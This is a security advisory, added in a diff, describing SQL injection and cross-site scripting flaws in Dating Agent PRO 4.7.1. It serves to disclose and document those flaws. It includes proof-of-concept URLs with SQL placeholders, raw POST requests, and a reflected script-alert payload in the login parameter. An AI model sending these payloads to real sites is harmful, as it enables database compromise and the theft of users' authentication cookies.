@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/18607/info
+
+Dating Agent is prone to multiple input-validation vulnerabilities. The issues include cross-site scripting and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+
+A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.
+
+These issues affect Dating Agent PRO version 4.7.1; other versions may also be vulnerable.
+
+http://www.example.com/picture.php?pid=1[SQL]
+http://www.example.com/mem.php?mid=1[SQL]
+http://www.example.com/search.php?search=3&sex=1[SQL]
+
+POST /search.php HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 97
+pictures=1&search=1&Submit2=1&Submit=1&sex=1&age1=1&age2=1&likes=1&maritalstatus=1&relationship=&#039;[SQL]
+
+http://www.example.com/webmaster/index.php?login=%22%3E%3Cscript%3Ealert%28%2FElipsis%2BSecurity%2BTest%2F%29%3C%2Fscript%3E&pswd=test
+
+POST /search.php HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 404
+Cookie: PHPSESSID=d83ded192782c72c7f90adbac4127d7d;pass=test
+sex=1&age1=1&age2=10000&likes=1&maritalstatus=Divorced&relationship=1&pictures=off&onlinet=0&search=&Submit=Search%20%26gt%3B&login=%22%3E%3Cscript%3Ealert%28%2FElipsis%2BSecurity%2BTest%2F%29%3C%2Fscript%3E&fname=1
